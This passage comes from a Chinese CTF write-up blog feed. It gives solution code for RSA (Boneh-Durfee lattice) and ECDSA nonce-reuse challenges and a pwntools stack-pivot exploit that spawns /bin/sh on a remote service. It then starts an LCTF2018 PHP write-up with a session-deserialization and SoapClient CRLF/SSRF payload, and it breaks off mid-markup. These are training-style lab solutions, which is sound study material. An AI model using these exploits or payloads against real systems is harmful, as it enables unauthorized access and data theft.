class="hljs-comment"># 对于多项式中的单项式。单项式（）：</span><br>            <span class="hljs-keyword">if</span> monomial <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> monomials:  <span class="hljs-comment"># 如果单项不在单项中</span><br>                monomials.append(monomial)<br>    monomials.sort()<br><br>    <span class="hljs-comment"># y-移位</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(floor(mm / tt) * jj, mm + <span class="hljs-number">1</span>):<br>            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)<br>            yshift = Q(yshift).lift()<br>            gg.append(yshift)  <span class="hljs-comment"># substitution</span><br><br>    <span class="hljs-comment"># 单项式 y 移位列表</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(floor(mm / tt) * jj, mm + <span class="hljs-number">1</span>):<br>            monomials.append(u ^ kk * y ^ jj)<br><br>    <span class="hljs-comment"># 构造格 B</span><br>    nn = <span class="hljs-built_in">len</span>(monomials)<br>    BB = Matrix(ZZ, nn)<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>        BB[ii, <span class="hljs-number">0</span>] = gg[ii](<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, ii + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> monomials[jj] <span class="hljs-keyword">in</span> gg[ii].monomials():<br>                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)<br><br>    <span class="hljs-comment"># 约化格的原型</span><br>    <span class="hljs-keyword">if</span> helpful_only:<br>        <span class="hljs-comment">#  #自动删除</span><br>        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># 重置维度</span><br>        nn = BB.dimensions()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> nn == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;failure&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># 检查向量是否有帮助</span><br>    <span class="hljs-keyword">if</span> debug:<br>        helpful_vectors(BB, modulus ^ mm)<br><br>    <span class="hljs-comment"># 检查行列式是否正确界定</span><br>    det = BB.det()<br>    bound = modulus ^ (mm * nn)<br>    <span class="hljs-keyword">if</span> det &gt;= bound:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Try with highers m and t.&quot;</span>)<br>        <span class="hljs-keyword">if</span> debug:<br>            diff = (log(det) - log(bound)) / log(<span class="hljs-number">2</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))<br>        <span class="hljs-keyword">if</span> strict:<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)<br><br>    <span class="hljs-comment"># display the lattice basis</span><br>    <span class="hljs-keyword">if</span> debug:<br>        matrix_overview(BB, modulus ^ mm)<br><br>    <span class="hljs-comment"># LLL</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)<br><br>    <span class="hljs-comment"># BB = BB.BKZ(block_size=25)</span><br>    BB = BB.LLL()<br><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LLL is done!&quot;</span>)<br><br>    <span class="hljs-comment"># 替换向量 i 和 j -&gt;多项式 1 和 2</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;在格中寻找线性无关向量&quot;</span>)<br>    found_polynomials = <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> pol1_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> pol2_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pol1_idx + <span class="hljs-number">1</span>, nn):<br><br>            <span class="hljs-comment"># 对于i and j, 构造两个多项式</span><br><br>            PR.&lt;w, z&gt; = PolynomialRing(ZZ)<br>            pol1 = pol2 = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>                pol1 += monomials[jj](w * z + <span class="hljs-number">1</span>, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)<br>                pol2 += monomials[jj](w * z + <span class="hljs-number">1</span>, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)<br><br>            <span class="hljs-comment"># 结果</span><br>            PR.&lt;q&gt; = PolynomialRing(ZZ)<br>            rr = pol1.resultant(pol2)<br><br>            <span class="hljs-keyword">if</span> rr.is_zero() <span class="hljs-keyword">or</span> rr.monomials() == [<span class="hljs-number">1</span>]:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="hljs-string">&quot;and&quot;</span>, pol2_idx)<br>                found_polynomials = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found_polynomials:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_polynomials:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    rr = rr(q, q)<br><br>    <span class="hljs-comment"># solutions</span><br>    soly = rr.roots()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(soly) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your prediction (delta) is too small&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    soly = soly[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    ss = pol1(q, soly)<br>    solx = ss.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> solx, soly<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">example</span>():<br>    start = time.clock()<br>    size = <span class="hljs-number">512</span><br>    length_N = <span class="hljs-number">2</span> * size;<br>    ss = <span class="hljs-number">0</span><br>    s = <span class="hljs-number">70</span>;<br>    M = <span class="hljs-number">1</span>  <span class="hljs-comment"># the number of experiments</span><br>    delta = <span class="hljs-number">299</span> / <span class="hljs-number">1024</span><br>    <span class="hljs-comment"># p =  random_prime(2^512,2^511)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(M):<br>        N = <br>        e = <br>        c = <br>        hint1 = <br>        hint2 = <br>        <br>        <br>        m = <span class="hljs-number">7</span>  <span class="hljs-comment"># 格大小（越大越好/越慢）</span><br>        t = <span class="hljs-built_in">round</span>(((<span class="hljs-number">1</span> - <span class="hljs-number">2</span> * delta) * m))  <span class="hljs-comment"># 来自 Herrmann 和 May 的优化</span><br>        X = floor(N ^ delta)  <span class="hljs-comment">#</span><br>        Y = floor(N ^ (<span class="hljs-number">1</span> / <span class="hljs-number">2</span>) / <span class="hljs-number">2</span> ^ s)  <span class="hljs-comment"># 如果 p、 q 大小相同，则正确</span><br>        <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(hint1), <span class="hljs-built_in">int</span>(hint1) + <span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n\n\n l=&#x27;</span>, l)<br>            pM = l;<br>            p0 = pM * <span class="hljs-number">2</span> ^ (size - s) + <span class="hljs-number">2</span> ^ (size - s) - <span class="hljs-number">1</span>;<br>            q0 = N / p0;<br>            qM = <span class="hljs-built_in">int</span>(q0 / <span class="hljs-number">2</span> ^ (size - s))<br>            A = N + <span class="hljs-number">1</span> - pM * <span class="hljs-number">2</span> ^ (size - s) - qM * <span class="hljs-number">2</span> ^ (size - s);<br>            <span class="hljs-comment"># A = N+1</span><br>            P.&lt;x, y&gt; = PolynomialRing(ZZ)<br>            pol = <span class="hljs-number">1</span> + x * (A + y)  <span class="hljs-comment"># 构建的方程</span><br><br>            <span class="hljs-comment"># boneh_durfee</span><br>            <span class="hljs-keyword">if</span> debug:<br>                <span class="hljs-comment">##print (&quot;=== running algorithm ===&quot;)</span><br>                start_time = time.time()<br><br>            solx, soly = boneh_durfee(pol, e, m, t, X, Y)<br><br>            <span class="hljs-keyword">if</span> solx &gt; <span class="hljs-number">0</span>:<br>                <span class="hljs-comment"># print (&quot;=== solution found ===&quot;)</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-literal">False</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x:&quot;</span>, solx)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;y:&quot;</span>, soly)<br><br>                d_sol = <span class="hljs-built_in">int</span>(pol(solx, soly) / e)<br>                ss = ss + <span class="hljs-number">1</span><br><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== solution found ===&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p的高比特为：&quot;</span>, l)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q的高比特为：&quot;</span>, qM)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d=&quot;</span>, d_sol)<br><br>            <span class="hljs-keyword">if</span> debug:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))<br>            <span class="hljs-comment"># break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ss=&quot;</span>, ss)<br>        <span class="hljs-comment"># end=time.process_time</span><br>        end = time.clock()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Running time: %s Seconds&#x27;</span> % (end - start))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    example()<br></code></pre></td></tr></table></figure><p>这个脚本可以跑出d，然后再带入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <br>c = <br>d= <br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h3 id="crypto2一血"><a class="markdownIt-Anchor" href="#crypto2一血"></a> crypto2(一血)</h3><p>简单的套几层没什么难度，正常喂ai都能出，当然了，谁说这一血被封啊，这一血实在是太好了！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> binascii<br>r = <span class="hljs-number">80932673752923845218731053671144903633094494351596082125742241568755353762809</span><br>s1 = <span class="hljs-number">11239004842544045364097722042148768449026688243093666008376082303522447245154</span><br>s2 = <span class="hljs-number">97301123368608673469588981075767011435222146576812290449372049839046298462487</span><br>z1 = <span class="hljs-number">84483328065344511722319723339101492661376118616972408250436525496870397932079</span><br>z2 = <span class="hljs-number">114907157406602520059145833917511615616817014350278499032611638874752053304591</span><br>n = <span class="hljs-number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span><br>encrypted_flag_hex = <span class="hljs-string">&quot;d8851c55edec1114a6d7a4d6d5efbba4611a39216ec146d2e675194dd0d5f768bee1b09799a133ffda1d283c4f6db475834cbe52c38c88736c94795c137490be&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_key</span>():<br>    s1_minus_s2 = (s1 - s2) % n<br>    z1_minus_z2 = (z1 - z2) % n<br>    k = (z1_minus_z2 * gmpy2.invert(s1_minus_s2, n)) % n<br>    dA = ((s1 * k - z1) * gmpy2.invert(r, n)) % n<br>    <span class="hljs-keyword">return</span> dA<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">victory_decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    key = key.upper()<br>    key_length = <span class="hljs-built_in">len</span>(key)<br>    plaintext = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ciphertext):<br>        <span class="hljs-keyword">if</span> char.isalpha():<br>            shift = <span class="hljs-built_in">ord</span>(key[i % key_length]) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)<br>            decrypted_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) - shift) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))<br>            plaintext += decrypted_char<br>        <span class="hljs-keyword">else</span>:<br>            plaintext += char<br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    dA = recover_key()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Recovered dA: <span class="hljs-subst">&#123;dA&#125;</span>&quot;</span>)<br>    key = sha256(<span class="hljs-built_in">int</span>(dA).to_bytes((<span class="hljs-built_in">int</span>(dA).bit_length() + <span class="hljs-number">7</span>) // <span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)).digest()<br>    encrypted_data = binascii.unhexlify(encrypted_flag_hex)<br>    iv = encrypted_data[:<span class="hljs-number">16</span>]<br>    ciphertext = encrypted_data[<span class="hljs-number">16</span>:]<br><br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    decrypted_victory = unpad(cipher.decrypt(ciphertext), AES.block_size).decode()<br>    flag = victory_decrypt(decrypted_victory, <span class="hljs-string">&quot;WANGDINGCUP&quot;</span>)<br>    flag = flag.lower()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted flag : <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2><h3 id="pwn2"><a class="markdownIt-Anchor" href="#pwn2"></a> Pwn2</h3><p>这题好像是参照的ciscn哪年的题目，具体不清楚</p><p>用ida简单的看一下，在login函数里面有账户和密码<code>admin::admin123</code>可以进行交互，成功后就可以进入vuln函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Enter your username:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;admin&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Enter your password:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;admin123&#x27;</span>)<br></code></pre></td></tr></table></figure><p>buf地址并且有溢出点，可以进行溢出</p><p>gift函数里面有system()函数，双击查看地址是<code>0x80484A0</code>,最后写入一个/bin/sh即可</p><p>添加目标函数地址（<code>system</code>）和参数（0 和缓冲区地址加16）。填充到80个字符，随后附加一个缓冲区地址和目标地址（<code>0x804860f</code>），用于控制程序的执行流，栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&#x27;xxxxx&#x27;</span>, xxxx)<br>elf = ELF(<span class="hljs-string">&#x27;./short&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Enter your username:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;admin&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Enter your password:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;admin123&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Buffer address: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(buf)&#125;</span>&quot;</span>)<br><br>system = <span class="hljs-number">0x080484a0</span><br><br>payload = (<br>    <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> +<br>    p32(system) +<br>    p32(<span class="hljs-number">0</span>) +<br>    p32(buf + <span class="hljs-number">16</span>) +<br>    <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>).ljust(<span class="hljs-number">0x50</span>) + p32(buf) + p32(<span class="hljs-number">0x804860f</span>)<br><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="misc4"><a class="markdownIt-Anchor" href="#misc4"></a> Misc4</h3><p>刚看到图片就觉得眼熟，好像在哪见过，考察的是peano曲线，这题也是原题，不多说了解题的不是我，参考链接</p><p><a href="https://github.com/IrisSec/IrisCTF-2024-Challenges/blob/27d482455a880972701d91afb8d9b137723db716/peanoscramble/setup/peano.py">IrisCTF-2024-Challenges/peanoscramble/setup/peano.py</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LCTF2018-bestphp&#39;s revenge</title>
    <link href="/2024/10/27/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/LCTF2018-bestphp&#39;s%20revenge/"/>
    <url>/2024/10/27/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/LCTF2018-bestphp&#39;s%20revenge/</url>
    
    <content type="html"><![CDATA[<p>前言:今天在学习php的原生类的时候看到的题，学习一下吧。</p><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p><a href="https://www.nssctf.cn/problem/34">在线靶场</a></p><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;implode&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>], <span class="hljs-variable">$_POST</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>) &#123; &#125; <br></code></pre></td></tr></table></figure><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><h3 id="call_user_func"><a class="markdownIt-Anchor" href="#call_user_func"></a> call_user_func()</h3><p>把第一个参数作为回调函数调用</p><h3 id="session反序列化"><a class="markdownIt-Anchor" href="#session反序列化"></a> session反序列化</h3><p>先看一下3种不同的 session 序列化处理器处理 session 的情况。先看案例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;orange&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当 session.serialize_handler=php 时，session文件内容为： <code>name|s:6:&quot;orange&quot;;</code></p><p>当 session.serialize_handler=php_serialize 时，session文件为：<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;orange&quot;;&#125;</code></p><p>当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符<code>names:6:&quot;orange&quot;;</code></p><p>当<code>session</code>反序列化和序列化时候使用不同引擎的时候,可以触发漏洞</p><p>php引擎会以<code>|</code>作为<code>key</code>和<code>value</code>的分隔符,传入内容时，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;|username&#x27;</span><br></code></pre></td></tr></table></figure><p>在使用php_serialize引擎时可以得到序列化内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;|username&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>然后在进行反序列化的时候|被当做分隔符，于是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>这部分会被当做key，然后后面的部分即<code>username</code>会被当做value</p><p>因此传入<code>$_SESSION['name'] = |序列化内容</code>这样的形式可以构造漏洞</p><h3 id="php原生类soapclient"><a class="markdownIt-Anchor" href="#php原生类soapclient"></a> PHP原生类SoapClient</h3><p>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。</p><p>可以调用其不存在的方法来触发<code>__call</code>魔术</p><p>通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容</p><p>由于其内置类有<code>__call</code>方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中（结合CRLF注入</p><h2 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h2><p>存在<code>session</code>反序列化的漏洞，取session的第一项与<code>welcome_to_the_lctf2018</code>构成数组，进行implode函数拼接</p><p>在<code>/flag</code>下有内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">only localhost can get flag!session<span class="hljs-emphasis">_start(); echo &#x27;only localhost can get flag!&#x27;; $flag = &#x27;LCTF&#123;<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>&#125;&#x27;;</span><br><span class="hljs-emphasis">if($\_</span>SERVER[&quot;REMOTE<span class="hljs-emphasis">_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123; $\_</span>SESSION[&#x27;flag&#x27;] = $flag; &#125;<br>only localhost can get flag! <br></code></pre></td></tr></table></figure><p>说明需要我们对<code>ip</code>进行伪造</p><p>思路大体是利用<code>SoapClient</code>类构造出ssrf的序列化字符串，然后利用<code>call_user_func</code>修改配置，造成序列化与反序列化引擎不同的漏洞，再调用<code>extract</code>函数去变量覆盖，调用SoapClient类，从而触发<code>__call</code> 方法</p><p>(需要自行在php.ini里把内置类启用)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<br>    <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;orange\r\nCookie:PHPSESSID=123456&quot;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;orange&#x27;</span>,<br>        <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span><br>    )<br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 